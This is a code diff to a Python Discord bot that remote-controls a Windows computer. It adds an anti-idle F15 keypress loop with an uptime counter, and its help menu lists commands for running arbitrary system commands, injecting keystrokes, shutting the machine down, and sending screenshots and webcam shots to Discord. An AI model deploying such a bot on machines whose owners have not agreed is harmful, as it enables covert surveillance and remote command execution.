@@ -3,9 +3,11 @@ import discord
 from discord.ext import commands
 import mss
 import cv2
+import asyncio
 import win32api
 import ctypes
 import time
+
 
 from typing import *
 from win32con import *
@@ -830,6 +832,29 @@ intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 
 
+async def background_task():
+  class Timer:
+    seconds = 0
+    minutes = 0
+    hours = 0
+
+  while True:
+    returnValue = Keyboard.pressAndReleaseKey('f15')
+    if returnValue == 'null':
+      print('Error: Keyboard.pressAndReleaseKey() returned "null" meaning an error occurred during execution.')
+
+    await asyncio.sleep(1)
+    Timer.seconds += 1
+    if Timer.seconds == 60:
+      Timer.minutes += 1
+      Timer.seconds = 0
+    if Timer.minutes == 60:
+      Timer.hours += 1
+      Timer.minutes = 0
+
+    msg = f'Bot Uptime: {Timer.hours:02}:{Timer.minutes:02}:{Timer.seconds:02}'
+    print(msg, end='\r')
+
 @bot.event
 async def on_ready():
   os.system('cls')
@@ -838,32 +863,33 @@ async def on_ready():
   print('Status: READY...\n')
 
   helpMsg = '''
-    Command                      Description                     Args   
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
+|     Command    |                  Description                |  Args |
+|----------------|---------------------------------------------|-------|
 | !ping          |  Returns the bot's current ping in MS       |  N/A  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !send-input    |  Presses then releases any keyboard key     |  key  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !press-mouse   |  Presses then releases any mouse button     |  key  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !command       |  Passes a command to the system             |  cmd  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !send-string   |  Sends a string of keyboard inputs          |  str  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !scroll-mouse  |  Scroll mouse by args direction and amount  |  <2>  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !find-mouse    |  Reply's with mouse's current location      |  X,Y  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !move-mouse    |  Move mouse to given X & Y coordinates      |  N/A  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !shutdown      |  Shuts down host computer                   |  N/A  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !uptime        |  Returns host computer's uptime             |  N/A  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
 | !screenshot    |  Reply's with a screen shot of displays     |  N/A  |
-|----------------------------------------------------------------------|
-| !webcam-shot   |  Reply's with a shot of the webcam          |  N/A  |
-|----------------------------------------------------------------------|
+|----------------|---------------------------------------------|-------|
+| !webcam        |  Reply's with a shot of the webcam          |  N/A  |
+|----------------|---------------------------------------------|-------|
   '''
 
   target_channel = bot.get_channel(1137852190933913741)
@@ -873,6 +899,7 @@ async def on_ready():
   else:
     print(f'Channel with ID: "{target_channel}" not found.')
   print(helpMsg)
+  bot.loop.create_task(background_task())
 
 
 @bot.command(name='ping', description='Get bot latency')
@@ -1002,7 +1029,7 @@ async def screenshot(ctx):
       await ctx.reply(f'Monitor {i + 1}', file=picture)
 
 
-@bot.command(name='webcam-shot', description='Grab a shot from the webcam')
+@bot.command(name='webcam', description='Grab a shot from the webcam')
 async def grabWebcam(ctx):
   pic_name = Helper.takeWebcamShot()
   await ctx.reply('Webcam', file=discord.File(pic_name))
